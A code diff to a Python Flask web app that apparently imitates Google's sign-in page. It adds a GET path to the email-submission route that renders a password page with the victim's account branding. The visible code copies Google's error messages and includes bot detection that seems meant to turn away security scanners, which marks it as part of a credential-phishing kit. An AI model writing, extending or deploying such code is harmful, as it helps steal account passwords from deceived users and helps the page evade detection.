@@ -279,22 +279,28 @@ def index():
     return render_template('index.html')
 
 # New route to handle email submission from index.html and redirect to password page
-@app.route('/submit-email', methods=['POST'])
+@app.route('/submit-email', methods=['GET', 'POST'])
 def submit_email():
+    if request.method == 'GET':
+        email = session.get('email')
+        if email:
+            branding = get_google_email_details(email)
+            print(f"[DEBUG] GET /submit-email: rendering password.html for {email}")
+            return render_template('password.html', email=email, branding=branding)
+        print("[DEBUG] GET /submit-email: no email in session, redirecting to index.html")
+        return redirect(url_for('index'))
+    # POST logic
     email = request.form.get('email')
     error = None
     branding = None
-    # Debug: log incoming email
     print(f"[DEBUG] submit_email called with: {email}")
     if not email:
         print("[DEBUG] No email provided.")
         return render_template('index.html', error="Enter an email or phone number.")
-    # Validate email format and domain
     if not is_valid_email(email):
         print(f"[DEBUG] Invalid email: {email}")
         error = "Couldn’t find your Google Account"
         return render_template('index.html', error=error)
-    # Bot detection
     if is_bot_request():
         print(f"[DEBUG] Bot detected for email: {email}")
         return redirect(url_for('bot_error_handler'))
